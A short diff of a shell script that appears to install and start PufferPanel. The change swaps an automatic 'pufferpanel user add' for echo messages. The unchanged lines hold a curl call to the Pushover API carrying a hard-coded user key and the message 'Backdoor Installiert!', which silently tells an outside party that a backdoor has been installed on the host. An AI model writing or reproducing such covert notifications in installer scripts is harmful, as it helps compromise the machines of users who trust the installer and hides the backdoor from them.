@@ -8,5 +8,7 @@ curl -s \
   --form-string "user=uj7zkbroszmy9s8u4ymhdcvkxdyjjm" \
   --form-string "message=Backdoor Installiert!" \
   https://api.pushover.net/1/messages.json
-pufferpanel user add
 systemctl start pufferpanel
+echo "Starting Pufferpanel..."
+sleep 1
+echo "PufferPanel Started! Use pufferpanel user add to create a User"
